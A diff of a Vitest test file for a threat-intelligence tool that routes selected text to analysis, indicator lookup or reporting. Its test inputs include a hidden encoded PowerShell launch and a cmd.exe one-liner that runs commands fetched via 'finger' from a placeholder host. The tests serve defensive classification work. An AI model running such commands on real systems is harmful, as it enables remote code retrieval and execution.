@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest'
 import { detectType, refang } from './indicators'
-import { classifyCockpitInput } from './intent'
+import { classifyCockpitInput, routeSelection } from './intent'
 
 describe('classifyCockpitInput — indicator branch', () => {
   it('classifies a bare IPv4 as indicator', () => {
@@ -146,5 +146,24 @@ describe('classifyCockpitInput — unclassified + determinism', () => {
   it('is deterministic', () => {
     const raw = 'CVE-2024-12345'
     expect(classifyCockpitInput(raw)).toBe(classifyCockpitInput(raw))
+  })
+})
+
+describe('routeSelection (extension selection router — data-boundary guard)', () => {
+  it('routes a command/script to the analyzer with the raw text', () => {
+    expect(routeSelection('powershell -nop -w hidden -enc AAAA')).toEqual({
+      mode: 'analyze', q: 'powershell -nop -w hidden -enc AAAA',
+    })
+    expect(routeSelection('cmd.exe /c for /f %e in (\'finger x@1.2.3.4\') do %e').mode).toBe('analyze')
+  })
+  it('routes an enrichable indicator to lookup, refanged', () => {
+    expect(routeSelection('45[.]9[.]148[.]20')).toEqual({ mode: 'lookup', q: '45.9.148.20' })
+    expect(routeSelection('evil.test').mode).toBe('lookup')
+  })
+  it('routes a CVE (indicator but not inline-enrichable) to the report tab', () => {
+    expect(routeSelection('CVE-2024-1234').mode).toBe('report')
+  })
+  it('routes empty / unclassifiable to report', () => {
+    expect(routeSelection('   ').mode).toBe('report')
   })
 })
